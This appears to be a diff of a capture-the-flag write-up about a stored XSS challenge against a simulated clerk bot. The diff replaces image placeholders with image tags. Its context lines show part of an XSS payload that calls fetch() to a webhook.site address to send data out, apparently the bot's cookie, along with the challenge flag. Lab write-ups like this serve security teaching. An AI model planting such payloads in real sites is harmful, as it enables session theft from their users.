@@ -16,7 +16,8 @@ The tile of this challenge suggested to me that there may be a bot simulating a 
 
 Soon enough my webhook site was pinged and I received the message:
 
-hook.png
+<img width="690" height="643" alt="hook" src="https://github.com/user-attachments/assets/5af6a773-f452-480a-870a-2d694f79739c" />
+
 
 The 'trusted clerk' had opened up our submission with the stored XSS payload!
 
@@ -31,7 +32,8 @@ fetch("https://webhook.site/fc3270b1-5cc2-42d3-90d4-ff80455965ff", {
 '>
 ```
 
-storedxss.png
+<img width="698" height="634" alt="storedxss" src="https://github.com/user-attachments/assets/1f8a34fd-81bc-4bec-8a1e-430d37577b9d" />
+
 
 `secedu{spr1nkle_s0me_http0nly_0n_y0ur_ch0colate_ch1p_c0oki3}`
 
